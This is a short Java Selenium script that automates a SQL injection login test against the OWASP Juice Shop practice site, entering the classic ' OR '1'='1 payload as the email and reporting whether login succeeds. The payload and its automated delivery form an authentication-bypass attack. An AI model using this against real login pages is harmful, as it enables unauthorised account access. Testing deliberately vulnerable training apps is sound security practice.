import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

public class SeleniumSQLInjection {
    public static void main(String[] args) {
        System.setProperty("webdriver.chrome.driver", "/path/to/chromedriver");

        WebDriver driver = new ChromeDriver();

        try {
            driver.get("https://juice-shop.herokuapp.com/#/login");

            WebElement usernameField = driver.findElement(By.id("email"));
            WebElement passwordField = driver.findElement(By.id("password"));
          
            String sqlInjectionPayload = "' OR '1'='1";
            usernameField.sendKeys(sqlInjectionPayload);

          
            String validPassword = "password"; 
            passwordField.sendKeys(validPassword);

            WebElement loginButton = driver.findElement(By.id("loginButton"));
            loginButton.click();

       
            Thread.sleep(2000); 
            WebElement errorMessage = driver.findElement(By.cssSelector(".error-message"));
            if (errorMessage.isDisplayed()) {
                System.out.println("Login failed: " + errorMessage.getText());
            } else {
                System.out.println("Login succeeded, possible SQL Injection vulnerability!");
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // Close the browser
            driver.quit();
        }
    }
}
